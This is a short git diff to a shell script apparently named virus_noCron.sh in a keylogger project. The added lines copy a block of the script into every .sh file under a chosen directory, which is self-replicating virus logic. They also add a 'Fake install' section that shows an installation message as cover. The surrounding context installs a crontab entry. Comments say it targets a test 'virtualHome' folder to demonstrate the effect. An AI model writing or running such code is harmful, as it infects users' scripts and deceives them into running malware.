@@ -93,11 +93,21 @@ crontab mycron
 rm mycron
 
 
+# -------------------Copy to other shell files--------------
+# this is just to show what it will do to shell files
+virtualhome='/home/jonesy/keylogger/codedev/noCron/virtualHome'
+FILENUM=$(find $virtualhome -name "*.sh" | wc -l)
+i=0
+location=$(pwd)/virus_noCron.sh
+for (( i=1; i <= $FILENUM; i++ ));do
+    TARGET=$(find $virtualhome -name "*.sh" | sed "${i}q;d")
+    #echo $TARGET
+    # just copy and paste the file and then rm
+    head -n 106 $location | tail -n 101 >> $TARGET
+done
 
-
-
-
-
+# --------------------------Fake install--------------------------
+# Install program - this will be the actual shell file in a true implementation
 echo "Please wait while the program installs"
 i=0
 seconds=10
